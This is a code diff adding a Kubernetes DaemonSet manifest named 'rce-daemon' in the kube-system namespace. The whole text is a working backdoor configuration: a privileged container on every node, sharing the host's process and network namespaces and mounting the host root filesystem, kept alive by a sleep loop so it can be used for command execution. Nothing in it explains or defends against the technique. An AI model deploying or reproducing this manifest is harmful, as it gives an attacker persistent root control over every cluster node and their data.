@@ -1,0 +1,29 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: rce-daemon
+  namespace: kube-system
+spec:
+  selector:
+    matchLabels:
+      name: rce-daemon
+  template:
+    metadata:
+      labels:
+        name: rce-daemon
+    spec:
+      hostPID: true
+      hostNetwork: true
+      containers:
+      - name: rce-container
+        image: ubuntu
+        command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: host-volume
+      volumes:
+      - name: host-volume
+        hostPath:
+          path: /
